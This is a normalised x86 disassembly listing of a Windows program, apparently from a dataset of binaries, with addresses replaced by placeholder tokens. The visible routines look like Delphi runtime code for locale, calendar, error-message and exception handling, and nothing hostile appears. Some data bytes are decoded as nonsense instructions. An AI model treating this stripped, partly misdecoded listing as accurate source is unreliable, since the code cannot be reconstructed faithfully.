mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_40440c
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_407e10
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_4041ac
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_40440c
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_407e10
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40ac1c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a6d0
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a6d0
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a6d0
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a63c
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a618
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a6d0
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a75c
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a63c
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a6d0
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a75c
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a618
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_4094dc
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a6d0
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a63c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a6d0
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a75c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a6d0
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a63c
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40ae10
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40a8d8
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4041ac
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40ae44
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40ac1c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4041ac
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40ae78
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40a8d8
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40ae44
mov ebx eax
jmp r-xdata
mov eax esi
call sub_4041ac
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40ac1c
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40af04
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_403fdc
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40af50
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_403f40
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_403fdc
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40af9c
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40afc4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40af50
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405c1c
sub_40b000
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b113
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40afc4
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403f40
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40afc4
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403f40
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40afc4
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_403f40
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40afc4
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_403f40
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b11a
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403f10
retn
sub_40b124
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_4040e4
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40b160
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b1c5
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4040e4
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_4080f8
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b1cc
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
inc ebx
sub_40b1d8
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b26f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40af50
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_4080f8
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b276
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b124
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40b160
call EnumCalendarInfoA
sub_40b288
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b452
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_403eec
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40af50
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_4080f8
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_4041ac
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b459
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403f10
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_4086f4
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c2f8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_40440c
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4041b4
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_403f40
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_4086f4
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4041b4
inc ebx
jmp r-xdata
mov eax esi
call sub_4041ac
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_4086f4
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4041b4
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4041b4
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4041b4
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_4040d4
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4041b4
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_4040d4
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_4041b4
sub_40b4bc
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b4b0
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c448
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_408618
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405188
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_4030c4
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408c3c
mov eax [ ebp - 0x4 ]
call sub_408588
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_4043ac
mov ebx eax
mov eax ebx
call sub_408588
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b644
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b4bc
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405188
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402a0c
call sub_40285c
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_408588
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b70c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403f40
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_40b748
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b7a2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408c7c
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403f40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b7a9
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
add esp 0xfffffff0
call sub_4034c0
sub_40b7a9
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_40b7c8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405c1c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_40b804
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b870
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405c1c
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408c7c
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403f40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b877
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f10
retn
add esp 0xfffffff0
call sub_4034c0
sub_40b877
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_40b8c4
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_4028d0
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b804
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40b924
sub [ ecx + 0xa0e0040 ] bh
push esp
inc ebp
js r-xdata
jg r-xdata
jo r-xdata
[ ebx - 0x3d ]
mov eax eax
loopne r-xdata
push edx
je r-xdata
pop ebp
cld
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ba34
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] ch
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_403f84
jmp r-xdata
push ebx
mov eax edx
jmp sub_403928
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b748
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ba3b
lea eax [ ebp - 0x20 ]
call sub_403eec
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b70c
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40b8c4
mov edx eax
sub_40b998
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ba34
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_403f84
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b748
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ba3b
lea eax [ ebp - 0x20 ]
call sub_403eec
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_40ba88
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40bb20
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bcdb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b748
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_40415c
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_4084a0
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b748
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bce2
lea eax [ ebp - 0x170 ]
call sub_403eec
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_403f10
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_40bcec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bda7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40ba88
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b70c
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
push ebp
call sub_40bb20
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bdae
lea eax [ ebp - 0x10 ]
call sub_403eec
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b748
mov ebx eax
sub_40bdc8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40bdb8
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40bb08
mov eax [ rw-data ]
mov [ eax ] sub_40bcec
mov eax sub_40ba54
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40ba70
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40be4c
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_403174
xor eax eax
mov [ rw-data ] eax
sub_40becc
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
